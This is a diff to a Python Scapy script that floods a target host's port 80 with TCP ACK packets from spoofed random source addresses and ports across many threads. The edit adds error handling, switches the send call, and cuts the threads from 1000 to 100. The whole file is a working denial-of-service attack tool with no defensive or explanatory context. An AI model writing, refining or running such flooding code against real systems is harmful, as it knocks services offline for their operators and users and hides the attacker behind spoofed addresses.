@@ -1,4 +1,4 @@
-from scapy.all import IP, TCP, RandIP, RandShort, send
+from scapy.all import IP, TCP, RandIP, RandShort, sendp
 import threading
 
 target_ip = "192.168.1.1"
@@ -6,13 +6,16 @@ target_port = 80
 
 def ack_flood_worker(target_ip, target_port):
     while True:
-        src_ip = RandIP()
-        src_port = RandShort()
-        ip = IP(src=src_ip, dst=target_ip)
-        tcp = TCP(sport=src_port, dport=target_port, flags="A")
-        packet = ip/tcp
+        try:
+            src_ip = RandIP()
+            src_port = RandShort()
+            ip = IP(src=src_ip, dst=target_ip)
+            tcp = TCP(sport=src_port, dport=target_port, flags="A")
+            packet = ip/tcp
 
-        send(packet, verbose=False)
+            sendp(packet, verbose=False)
+        except Exception as e:
+            print(f"Error: {e}")
 
 def ack_flood(target_ip, target_port, num_threads=10):
     threads = []
@@ -24,4 +27,4 @@ def ack_flood(target_ip, target_port, num_threads=10):
     for thread in threads:
         thread.join()
 
-ack_flood(target_ip, target_port, num_threads=1000)
+ack_flood(target_ip, target_port, num_threads=100)
